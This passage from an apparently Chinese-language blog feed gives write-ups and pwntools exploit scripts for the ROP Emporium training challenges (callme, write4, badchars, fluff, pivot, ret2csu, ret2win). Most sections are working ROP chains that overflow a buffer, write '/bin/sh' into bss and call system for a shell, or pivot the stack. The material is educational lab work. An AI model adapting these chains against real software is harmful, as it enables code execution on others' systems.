title="3-callme"></a>3-callme</h2><p>题目意思大概是叫我们分别调用callme_one callme_two callme_three来得到flag，要想知道这些函数到底是干什么的还是要去.so文件里看一下具体的函数（其实主要是它竟然给了我们一个.so文件，那肯定不会没用啊，而且callme里对这三个函数就是一笔带过，啥都没写）</p><p>so里的三个函数传的参都是1、2、3，意思就是我们要把这些参数压进栈内，然后调用callme的三个函数，但是貌似每次调用都要传参，才能调用到下一个函数，所以我们要pop三个寄存器出来存着三个数</p><p><img src="/2019/07/08/ROP Emporium/callme_pop.jpg" alt></p><p>然后找到rdi rsi rdx三个可以用的<br>接下来上脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./callme'</span>)</span><br><span class="line"></span><br><span class="line">callme_one = 0x0401850</span><br><span class="line">callme_two = 0x0401870</span><br><span class="line">callme_three = 0x0401810</span><br><span class="line"></span><br><span class="line">pop_rdi_rsi_rdx = 0x0401ab0 <span class="comment">#wirte 1/2/3 in callme</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_one)</span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_two)</span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_three)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>32位不需要调用rdi来存放指令，但是它需要用到堆栈平衡，在调用函数之后的栈帧里，存的是它的返回地址，而后面是调用函数的参数。（这里就没写exp）<br>但64位需要用到rdi，rsi，rdx来存参，参数在调用前进栈，存入相应位置。</p><h2 id="4-write4"><a href="#4-write4" class="headerlink" title="4-write4"></a>4-write4</h2><p>首先，我们明确一下思路，是要将”/bin/sh”写入bss段里。<br>借助pop</p><p><img src="/2019/07/08/ROP Emporium/write4_pop1.jpg" alt></p><p>然后我们选那个r14、r15的地址<br>然后还要去找mov的地址来给寄存器赋值的</p><p><img src="/2019/07/08/ROP Emporium/write4_pop2.jpg" alt></p><p>然后我们找到有r14和r15的，[r14]是代表r14的地址，r15则是对应的值，假设r14地址为0x0401809，r15里的值是“abc”，则这个命令就是，让r14里的地址指向r15里的内容，即0x0401809-&gt;“abc”。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./write4'</span>)</span><br><span class="line"></span><br><span class="line">system = 0x04005E0</span><br><span class="line">pop_rdi = 0x0400893 </span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">pop_r14_r15 = 0x0400890 </span><br><span class="line">mov_r14_r15 = 0x0400820 </span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20+p64(0)</span><br><span class="line">payload += p64(pop_r14_r15) + p64(bss) + <span class="string">"/bin/sh\x00"</span> + p64(mov_r14_r15) <span class="comment">#save the /bin/sh into bss</span></span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(system) <span class="comment">#rdi-&gt;system   bss is the x in system</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5-badchars"></a>5-badchars</h2><p>通过程序我们知道，它阻止了几个字符的输入，使个别字符强行转换成21（会影响“/bin/sh”的写入），所以我们要绕过它</p><p><img src="/2019/07/08/ROP Emporium/badchars_bad.jpg" alt></p><p>最简单的加密解密方法就是异或了，我们来找一个数字，使输入异或之后不等于badchars即可，脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line">chars = [98,105,99,47,32,102,110,115]</span><br><span class="line">num = 1</span><br><span class="line">binsh = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"><span class="keyword">while</span> 1:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> binsh:</span><br><span class="line">x = ord(i) ^ num  </span><br><span class="line"><span class="keyword">if</span> x <span class="keyword">in</span> chars:</span><br><span class="line">num += 1</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i == <span class="string">"\x00"</span>:</span><br><span class="line"><span class="built_in">print</span> num</span><br><span class="line">num += 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> num == 10:</span><br><span class="line"><span class="built_in">break</span></span><br></pre></td></tr></table></figure><p>我们选用2<br>然后我们就可以写exp了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(<span class="string">'./badchars'</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">num = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> binsh:</span><br><span class="line">num += chr(ord(x)^2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = 0x04006F0 </span><br><span class="line">bss = 0x0601080 </span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0400b39 </span><br><span class="line">mov_r12_r13 = 0x0400b34  </span><br><span class="line">pop_r12_r13 = 0x0400b3b  </span><br><span class="line"><span class="comment">#write num in bss</span></span><br><span class="line"></span><br><span class="line">pop_r14_r15 = 0x0400b40</span><br><span class="line">xor_r15_r14 = 0x0400b30 <span class="comment">#back to binsh</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * 0x20 + p64(0)</span><br><span class="line">payload += p64(pop_r12_r13) + num + p64(bss) + p64(mov_r12_r13)</span><br><span class="line"></span><br><span class="line"><span class="comment">#back to binsh</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(num)):</span><br><span class="line">payload += p64(pop_r14_r15) + p64(2) + p64(bss+i)</span><br><span class="line">payload += p64(xor_r15_r14)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(system)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="6-fluff"><a href="#6-fluff" class="headerlink" title="6-fluff"></a>6-fluff</h2><p>这个和前面的write4有异曲同工之处，只不过这个程序没有那么多的mov，需要借助到xor（xor自身会清空，xor另一个数，就等于存值）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./fluff'</span>)</span><br><span class="line"></span><br><span class="line">system = 0x04005E0</span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x04008c3 </span><br><span class="line">pop_r12 = 0x04008bc</span><br><span class="line"><span class="comment">#pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"></span><br><span class="line">xor_r11_r11 = 0x0400822</span><br><span class="line"><span class="comment"># xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret</span></span><br><span class="line">xor_r11_r12 = 0x040082f</span><br><span class="line"><span class="comment"># xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret</span></span><br><span class="line">xchg_r11_r10 = 0x0400840</span><br><span class="line"><span class="comment"># xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret</span></span><br><span class="line">mov_r10_r11 = 0x040084e</span><br><span class="line"><span class="comment"># mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload += p64(pop_r12) + p64(bss) + p64(0) + p64(0) + p64(0) </span><br><span class="line">payload += p64(xor_r11_r11) + p64(0) </span><br><span class="line">payload += p64(xor_r11_r12) + p64(0)</span><br><span class="line">payload += p64(xchg_r11_r10) + p64(0) </span><br><span class="line">payload += p64(pop_r12) + <span class="string">"/bin/sh\x00"</span>+ p64(0) + p64(0) + p64(0) </span><br><span class="line">payload += p64(xor_r11_r11) + p64(0)</span><br><span class="line">payload += p64(xor_r11_r12) + p64(0) </span><br><span class="line">payload += p64(mov_r10_r11) + p64(0) + p64(0) </span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(system)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="7-pivot"><a href="#7-pivot" class="headerlink" title="7-pivot"></a>7-pivot</h2><p>这个貌似有用到栈迁移的东西，这个程序有两个输入，第一个是写到堆里（它给出了堆的地址），第二个是写入到栈里。很明显第二次能输入的内容太少，所以payload写入堆里，然后在栈里调用。</p><p>.so里有一个后门函数，可以直接调用ret2win，cat到flag。而要leak真实地址的话要找两个文件都有的函数，貌似是只有foothold_function函数#函数需要经过一次调用之后got表里才会有真实地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pivot'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libpivot.so'</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_so = libc.symbols[<span class="string">'foothold_function'</span>]</span><br><span class="line">ret2win = libc.symbols[<span class="string">'ret2win'</span>]</span><br><span class="line"></span><br><span class="line">foothold_function_plt = 0x0400850</span><br><span class="line">foothold_function_got = 0x0602048</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offest = ret2win - foothold_function_so</span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget</span></span><br><span class="line">pop_rax = 0x0400b00</span><br><span class="line">mov_rax_addr = 0x0400b05</span><br><span class="line">pop_rbp = 0x0400900</span><br><span class="line">pop_rdi = 0x0400b73</span><br><span class="line"></span><br><span class="line">call_rax = 0x040098e</span><br><span class="line">add_rax_rbp = 0x0400b09</span><br><span class="line"></span><br><span class="line">xchg_rax_rsp = 0x0400b02</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"The Old Gods kindly bestow upon you a place to pivot: "</span>)</span><br><span class="line">heap_addr  = int(sh.recv(14),16)</span><br><span class="line"></span><br><span class="line">payload1 = p64(foothold_function_plt) + p64(pop_rax) + p64(foothold_function_got) + p64(mov_rax_addr)</span><br><span class="line">payload1 += p64(pop_rbp) + p64(offest) + p64(add_rax_rbp) + p64(call_rax)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload2 += p64(pop_rax) + p64(heap_addr) + p64(xchg_rax_rsp)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.recvuntil(<span class="string">"into libpivot.so"</span>)  <span class="comment">#foothold_function() in libpivot.so print this sentence</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="8-ret2csu"><a href="#8-ret2csu" class="headerlink" title="8-ret2csu"></a>8-ret2csu</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2csu'</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">system = 0x04005A0</span><br><span class="line">ret2win = 0x04007B1</span><br><span class="line">init = 0x0600E18   <span class="comment">#self init/fini</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget </span></span><br><span class="line">pop5_addr = 0x040089A  <span class="comment">#pop_rbx_rbp_r12_r13_r14_r15</span></span><br><span class="line">mov_call = 0x0400880   <span class="comment">#mov rdx_r15 rsi_r14 edi_r13d  call r12+rbp*8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload += p64(pop5_addr) + p64(0) + p64(1) + p64(init) + p64(0) + p64(0) + p64(0xdeadcafebabebeef)</span><br><span class="line">payload += p64(mov_call) + <span class="string">"a"</span>*56 + p64(ret2win)</span><br><span class="line">gdb.attach(sh,<span class="string">'b setvbuf'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里是ROP Emporium的题的exp，然后由于我太懒，exp都是64位的，32位的还没写。&lt;/p&gt;
&lt;h2 id=&quot;1-ret2win&quot;&gt;&lt;a href=&quot;#1-ret2win&quot; class=&quot;headerlink&quot; title=&quot;1-ret2win&quot;&gt;&lt;/a&gt;1-ret2win&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# -*- coding:utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh = process(&lt;span class=&quot;string&quot;&gt;&#39;./ret2win&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;shell=0x0400824&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bss = 0x0601060&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload = 0x20*&lt;span class=&quot;string&quot;&gt;&quot;a&quot;&lt;/span&gt; + p64(0) + p64(shell)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="wp" scheme="https://c0yo7e.github.io/tags/wp/"/>
    
  </entry>
  
</feed>
